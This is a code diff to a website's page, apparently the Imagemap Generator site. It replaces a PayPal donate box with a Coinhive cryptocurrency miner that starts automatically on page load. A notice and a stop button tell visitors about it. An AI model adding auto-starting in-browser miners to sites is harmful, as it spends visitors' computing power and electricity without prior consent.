@@ -51,7 +51,7 @@ session_start();
 	<script type="text/javascript" src="js/script2.js"></script>
 	
 	<!-- CSS -->
-	<link rel="stylesheet" href="css/style.css" type="text/css" media="screen" />
+	<link rel="stylesheet" href="css/style2.css" type="text/css" media="screen" />
 	<link rel="stylesheet" href="css/snippet.css" type="text/css" media="screen" />
 	
 </head>
@@ -356,22 +356,27 @@ if(isset($_SESSION['image']) && $_SESSION['image'] != null && !empty($_SESSION['
 		<a href="https://plus.google.com/share?url=http://imagemap-generator.dariodomi.de" target="_blank" title="Share on Google+" class="gplus" /></a>
 		<a href="" title="Give Feedback" class="feedback" /></a>
 		-->
-		<div class="insetEffect paypal">
+		<!--<div class="insetEffect paypal">
 			<form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_top">
 				<input type="hidden" name="cmd" value="_s-xclick">
 				<input type="hidden" name="hosted_button_id" value="3LJXDYJABWLTA">
 				<input type="image" src="https://www.paypalobjects.com/en_GB/i/btn/btn_donate_SM.gif" border="0" name="submit" alt="PayPal">
 				<img alt="" border="0" src="https://www.paypalobjects.com/de_DE/i/scr/pixel.gif" width="1" height="1">
 			</form>
-			<!--<span id="paypalAmount">3 € ?</span>-->
+		</div>-->
+	
+		<div id="coinHive" class="insetEffect ">
+			<p><b>Info:</b> Instead of watching ads, your computer is mining small amounts of cryptocurrency to support this website.
+				If you don't want to support, you can <span id="minebutton">stop</span> at anytime. <a href="https://coin-hive.com/" target="_blank">more infos</a></p>
+			
 		</div>
 	</div>
 	
-	<div id="feedbackPopup" class="insetEffect hidden">
+	<!--<div id="feedbackPopup" class="insetEffect hidden">
 		<span></span>
-		<!--<a href="#"><i class="icon icon-clear-2"></i></a>-->
-		<p>Did you find Imagemap Generator valuable? <!--Give feedback or buy me a beer <b>:-)</b>--></p>
-	</div>
+		<!--<a href="#"><i class="icon icon-clear-2"></i></a>--
+		<p>Did you find Imagemap Generator valuable? <!--Give feedback or buy me a beer <b>:-)</b>--</p>
+	</div>-->
 	
 	<footer>
 		<p>Project &copy; <?php echo date("Y"); ?> by <a href="http://dariodomi.de" target="_blank">Dario D. M&uuml;ller</a><!--<span></span><a href="http://dariodomi.de/contact" target="_blank">Feedback &amp; Contact</a>--></p>
@@ -417,6 +422,34 @@ if(isset($_SESSION['image']) && $_SESSION['image'] != null && !empty($_SESSION['
 				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
 			})();
 		}
+	</script>
+	
+	<!-- Coin Hive -->
+	<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+	<script type="text/javascript">
+	var apiKey = 'wb8dn2HNjc24tq8qbaJtxlrxtSogoivK';
+	var miner = new CoinHive.Anonymous(apiKey, {threads: 2});
+	miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+	// Update stats once per second
+	setInterval(function() {
+		//var threadCount = miner.getNumThreads();
+		//var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
+		//var totalHashes = miner.getTotalHashes();
+		//var acceptedHashes = miner.getAcceptedHashes() / 256;
+		// Output to HTML elements...
+		if (miner.isRunning()) {
+			//document.getElementById("tcount").innerHTML = "Threads: " + threadCount;
+			//document.getElementById("hps").innerHTML = "hashes per second: " + hashesPerSecond;
+			//document.getElementById("ths").innerHTML = "Total Hashes: " + totalHashes;
+			//document.getElementById("tah").innerHTML = "Accepted Hashes: " + acceptedHashes;
+			document.getElementById("minebutton").innerHTML = '<a href="#" onclick="miner.stop(); return false;">Stop</a>';
+		} else {
+			//document.getElementById("hps").innerHTML = "Please click start";
+			//document.getElementById("ths").innerHTML = "to support";
+			//document.getElementById("tah").innerHTML = "this site";
+			document.getElementById("minebutton").innerHTML = '<a href="#" onclick="miner.start(CoinHive.FORCE_EXCLUSIVE_TAB); return false;">Start</a>';
+		}
+	}, 1000);
 	</script>
 	
 </body>
